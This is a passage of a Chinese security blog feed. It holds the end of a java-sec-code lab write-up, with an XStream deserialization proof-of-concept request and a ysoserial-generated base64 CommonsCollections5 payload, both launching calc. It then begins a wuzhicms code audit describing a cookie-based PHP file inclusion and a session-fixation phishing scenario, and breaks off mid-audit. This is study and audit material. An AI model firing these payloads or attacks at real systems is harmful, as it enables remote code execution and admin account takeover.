class="hljs-string">&quot;xstream&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xstream</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=629E8EB9997DA26781472C6FFCAF7454; XSRF-TOKEN=f6390ed7-0e1c-4fbe-a342-1177716a0983; remember-me=YWRtaW46MTc1NDgwMTUzMDEzMTowZDM3ZjcxZDFmODc2YmUyNDQ0NGY3MmZkYTFkY2NmMQ<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>439<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span>  </span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span> <span class="hljs-comment">&lt;!-- --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>cmd<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947651.png" alt="20250727132402482"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>java经典反序列化漏洞复现</p><p><a href="https://www.cnblogs.com/0kooo-yz/p/18399516">https://www.cnblogs.com/0kooo-yz/p/18399516</a></p><p>代码审计入门之java-sec-code（一）</p><p><a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><p>Java-Sec代码审计漏洞篇(一)</p><p><a href="https://xz.aliyun.com/news/15669">https://xz.aliyun.com/news/15669</a></p><p>Java-Sec代码审计漏洞篇(二)</p><p><a href="https://xz.aliyun.com/news/15721">https://xz.aliyun.com/news/15721</a></p><p>Java-sec-code靶场分析练习</p><p><a href="https://buaq.net/go-307106.html">https://buaq.net/go-307106.html</a></p><p>java-sec-code 靶场复现</p><p><a href="https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/">https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/</a></p><p>SnakeYaml反序列化漏洞研究</p><p><a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p><p>跨域资源共享 CORS 详解</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><p>初识HTTP响应拆分攻击（CRLF Injection）</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CSRF漏洞原理攻击与防御（非常细）-CSDN博客</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">https://blog.csdn.net/qq_43378996/article/details/123910614</a></p><p>JSONP 跨域原理及实现</p><p><a href="https://segmentfault.com/a/1190000041946934">https://segmentfault.com/a/1190000041946934</a></p><p> PostgreSQL JDBC 驱动远程代码执行漏洞（CVE-2022-21724）</p><p><a href="https://avd.aliyun.com/detail?id=AVD-2022-21724&timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr+mCnCoD">https://avd.aliyun.com/detail?id=AVD-2022-21724&amp;timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr%2BmCnCoD</a></p><p>PreparedStatement的使用</p><p><a href="https://www.cnblogs.com/ysw-go/p/5459330.html">https://www.cnblogs.com/ysw-go/p/5459330.html</a></p><p>路径穿越（Path Traversal）详解-CSDN博客</p><p><a href="https://blog.csdn.net/qingzhantianxia/article/details/128204437">https://blog.csdn.net/qingzhantianxia/article/details/128204437</a></p><p>SSTI（模板注入）漏洞（入门篇）</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">https://blog.csdn.net/qq_43378996/article/details/124050308</a></p><p>由浅入深SpEL表达式注入漏洞</p><p><a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p>XXE漏洞原理、检测与修复</p><p><a href="https://www.cnblogs.com/mysticbinary/p/12668547.html">https://www.cnblogs.com/mysticbinary/p/12668547.html</a></p><p>从XML相关一步一步到XXE漏洞</p><p><a href="https://xz.aliyun.com/news/6483">https://xz.aliyun.com/news/6483</a></p><p>CVE-2020-26217 | XStream远程代码执行漏洞 </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p><h1 id="工具的安装-使用"><a href="#工具的安装-使用" class="headerlink" title="工具的安装&amp;使用"></a>工具的安装&amp;使用</h1><h2 id="ysoserial-jar"><a href="#ysoserial-jar" class="headerlink" title="ysoserial.jar"></a>ysoserial.jar</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br><br>检查Java版本：<br>java -version<br>若未安装：<br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install openjdk-8-jdk-headless<br><br>安装 Git 和 Maven<br><span class="hljs-built_in">sudo</span> apt install git maven -y<br><br>拉取源码<br>git <span class="hljs-built_in">clone</span> https://github.com/frohoff/ysoserial.git<br><br>编译<br><span class="hljs-built_in">cd</span> ysoserial<br>mvn clean package -DskipTests<br><br>编译后所在文件夹<br><span class="hljs-built_in">cd</span> target/ysoserial-0.0.6-SNAPSHOT-all.jar <br><br>重命名<br><span class="hljs-built_in">cp</span> target/ysoserial-*-all.jar ~/ysoserial.jar<br><br>测试是否安装成功<br>java -jar ysoserial.jar<br><br>生成payload<br>calcWindows 内置命令<br><span class="hljs-string">&quot;gnome-calculator&quot;</span>Linux + GUI + 有此命令<br><span class="hljs-string">&quot;open -a Calculator&quot;</span>macOS + 图形环境<br><br>Windows：<br><br>java -jar ~/ysoserial.jar CommonsCollections5 calc | <span class="hljs-built_in">base64</span><br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms 代码审计</title>
    <link href="/2025/07/20/wuzhicms/"/>
    <url>/2025/07/20/wuzhicms/</url>
    
    <content type="html"><![CDATA[<h1 id="wuzhicms-代码审计"><a href="#wuzhicms-代码审计" class="headerlink" title="wuzhicms 代码审计"></a>wuzhicms 代码审计</h1><h1 id="根目录分析"><a href="#根目录分析" class="headerlink" title="根目录分析"></a>根目录分析</h1><p>apiAPI接口，找未授权、SQL注入<br>caches 缓存目录<br>configs配置文件<br>coreframe框架核心代码<br>install安装目录，安装后应删除<br>map<br>promote<br>res静态资源<br>uploadfile上传文件储存目录，文件上传漏洞</p><h1 id="分析代码-参考README-md"><a href="#分析代码-参考README-md" class="headerlink" title="分析代码(参考README.md)"></a>分析代码(参考README.md)</h1><p>程序模块结构说明</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">-- coreframe                   #框架目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- app                     #模块（应用程序）目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- affiche             #公告模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- appshop             #应用商城</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- attachment          #附件模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- collect             #采集器</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content             #内容模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core                #核心模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- coupon              #优惠券模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- credit              #积分模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- database            #数据库模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- dianping            #点评模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- guestbook           #留言板模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- link                #友情链接模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- linkage             #联动菜单</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- member              #会员模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- message             #站内短信模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- mobile              #移动手机模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- order               #订单模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- pay                 #支付模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- ppc                 #推广模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- receipt             #发票申请模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- search              #全站搜索模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- sms                 #短信模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- tags                #tags模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   --- template            #在线模板编辑</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- configs                 #框架配置</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core.php                #框架入口</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab                 #定时脚本目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab.php             #定时脚本入口</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- extend                  #扩展目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- languages               #语言包</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #模板</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- caches                      #缓存目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- _cache_                 #公共缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- block                   #区块、碎片缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content                 #内容模块缓存，栏目缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- db_bak                  #数据库备份路径</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- install.check           #安装锁定</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- model                   #模型缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #模板缓存</span><br><span class="hljs-string">--- www                         #网站根目录</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- 404.html                #404页面</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- admin.php               #后台入口</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- api                     #api目录</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- configs                 #网站配置</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- favicon.ico             #浏览器icon</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.html              #网站首页</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.php               #动态地址首页</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- res                     #静态资源</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- robots.txt              #搜索引擎防抓取规则</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- uploadfile              #附件</span><br><span class="hljs-string">    `-- web.php                 #自定义路由</span><br></code></pre></td></tr></table></figure><h2 id="app-模块（应用程序）目录"><a href="#app-模块（应用程序）目录" class="headerlink" title="app&#x2F; #模块（应用程序）目录"></a>app&#x2F; #模块（应用程序）目录</h2><p>先去核心模块看</p><h3 id="coreframe-app-core-admin-index-php后台登录首页"><a href="#coreframe-app-core-admin-index-php后台登录首页" class="headerlink" title="coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php后台登录首页"></a>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php后台登录首页</h3><p>因为没有对$lang进行检验和过滤，通过设置cookie值，对require的路径拼接，使require执行任何PHP文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;<br>        <br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">left</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;              <br></code></pre></td></tr></table></figure><p>此处是ai发现的一个漏洞，实际上很难触发，记录：</p><ol><li>登录成功后不生成新session ID</li><li>直接重用攻击者提供的session ID</li></ol><p>利用：</p><ol><li>攻击者获取自己的session ID：<code>PHPSESSID=attacker_sess</code></li><li>构造钓鱼链接：</li></ol><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://target.com/admin/?m=core&amp;f=index&amp;v=login&amp;submit=1&amp;checkcode=...</span>[<span class="hljs-string">有效验证码</span>]...&amp;username=admin&amp;password=123456<br></code></pre></td></tr></table></figure><ol><li>诱使管理员点击链接（含攻击者的session ID）</li><li>管理员登录后，攻击者使用相同的<code>PHPSESSID</code>即可直接进入管理员账户</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//登录</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//已经登陆的用户重定向到后台首页</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;already login&#x27;</span>), <span class="hljs-string">&#x27;?m=core&amp;f=index&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">su</span>(<span class="hljs-number">0</span>));<br>        &#125;<br>...<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>暴露敏感信息：当然，需要登录到后台才能利用，所以不算高危。</p><p>路由：</p><p><code>http://wuzhicms:7575/index.php?m=core&amp;f=index&amp;_su=wuzhicms&amp;v=phpinfo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 